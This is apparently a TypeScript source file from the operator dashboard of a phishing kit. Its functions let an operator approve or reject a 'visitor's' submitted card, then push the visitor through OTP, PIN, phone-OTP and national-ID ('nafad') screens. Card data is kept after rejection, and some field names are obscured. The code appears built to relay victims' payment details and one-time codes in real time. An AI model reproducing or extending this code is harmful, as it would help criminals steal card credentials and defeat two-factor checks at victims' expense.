/**
 * Actions for handling history entries in the dashboard
 */

import { updateApplication } from "./firebase-services"
import type { HistoryEntry } from "./history-helpers"

/**
 * Update the status of a history entry
 */
export async function updateHistoryStatus(
  visitorId: string,
  historyId: string,
  newStatus: "approved" | "rejected" | "approved_with_otp" | "approved_with_pin" | "resend",
  history: HistoryEntry[]
): Promise<void> {
  const updatedHistory = history.map((entry) => {
    if (entry.id === historyId) {
      return { ...entry, status: newStatus }
    }
    return entry
  })
  
  await updateApplication(visitorId, { history: updatedHistory as any })
}

/**
 * Handle card approval
 */
export async function handleCardApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Show OTP dialog
  await updateApplication(visitorId, {
    otpStatus: "show_otp" as any
  })
}

/**
 * Handle card rejection
 */
export async function handleCardRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Reject card and notify visitor (keep card data for history)
  await updateApplication(visitorId, {
    cardStatus: "rejected"
  })
}

/**
 * Handle OTP approval
 */
export async function handleOtpApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Approve OTP and show PIN dialog
  await updateApplication(visitorId, {
    _v5Status: "approved",
    otpStatus: "show_pin" as any
  })
}

/**
 * Handle OTP rejection
 */
export async function handleOtpRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Reject OTP and notify visitor
  await updateApplication(visitorId, {
    _v5Status: "rejected"
  })
}

/**
 * Handle phone OTP approval
 */
export async function handlePhoneOtpApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Move to nafad page
  await updateApplication(visitorId, {
    phoneOtpStatus: "approved" as any
  })
}

/**
 * Handle phone OTP rejection
 */
export async function handlePhoneOtpRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Clear phone OTP and reopen dialog
  await updateApplication(visitorId, {
    _v7: "", // phoneOtp
    phoneOtp: "",
    phoneOtpStatus: "show_phone_otp" as any
  })
}

/**
 * Handle phone OTP resend
 */
export async function handlePhoneOtpResend(visitorId: string): Promise<void> {
  await updateApplication(visitorId, {
    _v7: "", // phoneOtp
    phoneOtp: "",
    phoneOtpStatus: "show_phone_otp" as any
  })
}
